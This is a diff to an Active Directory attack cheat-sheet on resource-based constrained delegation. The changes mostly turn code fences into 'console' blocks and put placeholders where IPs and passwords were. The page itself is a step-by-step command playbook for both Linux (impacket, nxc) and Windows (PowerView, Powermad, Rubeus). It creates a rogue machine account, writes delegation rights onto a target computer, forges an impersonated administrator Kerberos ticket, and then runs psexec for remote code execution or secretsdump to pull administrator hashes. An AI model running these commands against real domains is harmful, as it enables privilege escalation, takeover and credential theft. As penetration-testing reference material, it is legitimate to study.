@@ -4,7 +4,6 @@ date: 2024-7-30
 tags: ["GenericAll", "active driectory", "ad", "Windows", "rbcd", "resource-based constrained delegation", "s4u", "impersonate"]
 ---
 
----
 ### RBCD Attack
 
 {{< tab set1 tab1 active >}}Linux{{< /tab >}}
@@ -15,8 +14,8 @@ tags: ["GenericAll", "active driectory", "ad", "Windows", "rbcd", "resource-base
 
 <div>
 
-```bash
-nxc ldap 10.10.11.10 -u <USER> -p <PASSWORD> -M MAQ
+```console
+nxc ldap <TARGET> -u <USER> -p '<PASSWORD>' -M MAQ
 ```
 
 </div>
@@ -25,8 +24,8 @@ nxc ldap 10.10.11.10 -u <USER> -p <PASSWORD> -M MAQ
 
 <div>
 
-```bash
-impacket-addcomputer -computer-name 'EvilComputer' -computer-pass 'password' -dc-ip 10.10.11.10 <DOMAIN>/<USER>:<PASSWORD>
+```console
+impacket-addcomputer -computer-name 'EvilComputer' -computer-pass '<COMPUTER_PASSWORD>' -dc-ip <TARGET> '<DOMAIN>/<USER>:<PASSWORD>'
 ```
 
 </div>
@@ -35,8 +34,8 @@ impacket-addcomputer -computer-name 'EvilComputer' -computer-pass 'password' -dc
 
 <div>
 
-```bash
-impacket-rbcd -delegate-to <TARGET_COMPUTER>$ -delegate-from EvilComputer$ -dc-ip <DC> -action 'write' <DOMAIN>/<USER>:<PASSWORD>
+```console
+impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -delegate-from 'EvilComputer$' -dc-ip <DC> -action 'write' '<DOMAIN>/<USER>:<PASSWORD>'
 ```
 
 </div>
@@ -45,8 +44,8 @@ impacket-rbcd -delegate-to <TARGET_COMPUTER>$ -delegate-from EvilComputer$ -dc-i
 
 <div>
 
-```bash
-sudo ntpdate -s <DC> && impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate administrator -dc-ip <DC> '<DOMAIN>/EvilComputer:password'
+```console
+sudo ntpdate -s <DC> && impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate administrator -dc-ip <DC> '<DOMAIN>/EvilComputer:<COMPUTER_PASSWORD>'
 ```
 
 </div>
@@ -55,7 +54,7 @@ sudo ntpdate -s <DC> && impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate ad
 
 <div>
 
-```bash
+```console
 export KRB5CCNAME=administrator@cifs_<TARGET_DOMAIN>@<DOMAIN>.ccache
 ```
 
@@ -65,12 +64,12 @@ export KRB5CCNAME=administrator@cifs_<TARGET_DOMAIN>@<DOMAIN>.ccache
 
 <div>
 
-```bash
+```console
 # Remote
 sudo ntpdate -s <DC> && impacket-psexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass
 ```
 
-```bash
+```console
 # Or secretsdump
 impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass -just-dc-user Administrator
 ```
@@ -84,7 +83,7 @@ impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass -just-dc-user Adm
 
 <div>
 
-```powershell
+```console
 . .\PowerView.ps1
 ```
 
@@ -94,7 +93,7 @@ impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass -just-dc-user Adm
 
 <div>
 
-```powershell
+```console
 Get-DomainObject -Identity 'DC=<EXAMPLE>,DC=<COM>' | select ms-ds-machineaccountquota
 ```
 
@@ -104,12 +103,12 @@ Get-DomainObject -Identity 'DC=<EXAMPLE>,DC=<COM>' | select ms-ds-machineaccount
 
 <div>
 
-```powershell
+```console
 . .\Powermad.ps1
 ```
 
-```powershell
-New-MachineAccount -MachineAccount EvilComputer -Password $(ConvertTo-SecureString 'password' -AsPlainText -Force)
+```console
+New-MachineAccount -MachineAccount EvilComputer -Password $(ConvertTo-SecureString '<COMPUTER_PASSWORD>' -AsPlainText -Force)
 ```
 
 </div>
@@ -120,27 +119,27 @@ New-MachineAccount -MachineAccount EvilComputer -Password $(ConvertTo-SecureStri
 
 <div>
 
-```powershell
+```console
 $fakesid = Get-DomainComputer EvilComputer | select -expand objectsid
 ```
 
-```powershell
+```console
 $fakesid
 ```
 
-```powershell
+```console
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
 ```
 
-```powershell
+```console
 $SDBytes = New-Object byte[] ($SD.BinaryLength)
 ```
 
-```powershell
+```console
 $SD.GetBinaryForm($SDBytes, 0)
 ```
 
-```powershell
+```console
 Get-DomainComputer TARGET_COMPUTER$ | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
 ```
 
@@ -150,15 +149,15 @@ Get-DomainComputer TARGET_COMPUTER$ | Set-DomainObject -Set @{'msds-allowedtoact
 
 <div>
 
-```powershell
+```console
 $RawBytes = Get-DomainComputer TARGET_COMPUTER -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
 ```
 
-```powershell
+```console
 $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
 ```
 
-```powershell
+```console
 $Descriptor.DiscretionaryAcl
 ```
 
@@ -168,12 +167,12 @@ $Descriptor.DiscretionaryAcl
 
 <div>
 
-```powershell
-.\rubeus.exe hash /password:password /user:EvilComputer /domain:<DOMAIN>
+```console
+.\rubeus.exe hash /password:'<COMPUTER_PASSWORD>' /user:EvilComputer /domain:<DOMAIN>
 ```
 
-```powershell
-.\rubeus.exe s4u /user:EvilComputer$ /rc4:<HASH> /impersonateuser:administrator /msdsspn:cifs/<TARGET_DOMAIN> /ptt /nowrap
+```console
+.\rubeus.exe s4u /user:'EvilComputer$' /rc4:<HASH> /impersonateuser:administrator /msdsspn:cifs/<TARGET_DOMAIN> /ptt /nowrap
 ```
 
 </div>
@@ -182,11 +181,11 @@ $Descriptor.DiscretionaryAcl
 
 <div>
 
-```bash
+```console
 python3 rubeustoccache.py <BASE64_TICKET> secrets.kirbi secrets.ccache
 ```
 
-```bash
+```console
 export KRB5CCNAME=secrets.ccache
 ```
 
@@ -198,12 +197,12 @@ export KRB5CCNAME=secrets.ccache
 
 <div>
 
-```bash
+```console
 # Remote
 sudo ntpdate -s <DC> && impacket-psexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass
 ```
 
-```bash
+```console
 # Or secretsdump
 impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass -just-dc-user Administrator
 ```
